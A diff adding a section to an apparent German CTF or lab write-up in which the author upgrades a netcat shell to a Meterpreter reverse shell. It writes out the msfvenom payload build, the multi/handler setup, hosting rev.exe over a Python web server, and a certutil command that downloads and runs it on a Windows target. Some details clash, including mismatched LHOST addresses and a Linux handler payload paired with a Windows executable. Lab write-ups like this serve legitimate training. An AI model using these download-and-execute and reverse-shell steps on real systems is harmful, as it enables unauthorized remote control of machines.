@@ -146,3 +146,46 @@ Zuerst laden wir uns den Code runter und lesen die Kommentare hier wird die Funk
  *
  */
 ```
+
+Da die NetCat shell aber super instabil ist Upgraden wir auf eine Revshell von msfvenom bzw eine Meterpreter shell
+
+Hierzu erstellen wir die Payload
+
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.88.32 LPORT=3333 -f exe > rev.exe
+```
+
+Starten den Rev shell handler
+```
+mfsconsole
+use multi/handler
+set PAYLOAD linux/x86/meterpreter/reverse_tcp
+set LHOST 10.10.88.23
+set LPORT 3333
+
+exploit
+```
+
+Jetzt müssen wir nurnoch die shell auf das ziel bekommen und ausführen 
+
+Hierfür starten wir einen basic web server auf dem angreifer system via 
+
+```
+python3 -m http.server
+```
+
+Jetzt steht die datei unter 
+
+http://10.10.88.23:8000/rev.exe
+zur verfügung und wir laden sie auf dem ziel runter. Ich habe hierführ den Temp Ordner genutzt da der meistens ohne Probleme funktioniert
+
+```
+cd c:\Windows\Temp
+
+certutil -urlcache -split -f http://10.10.88.23:8000/rev.exe rev.exe
+
+rev.exe
+```
+
+Schon haben wir die Rev shell mit dem Handler gefangen
+
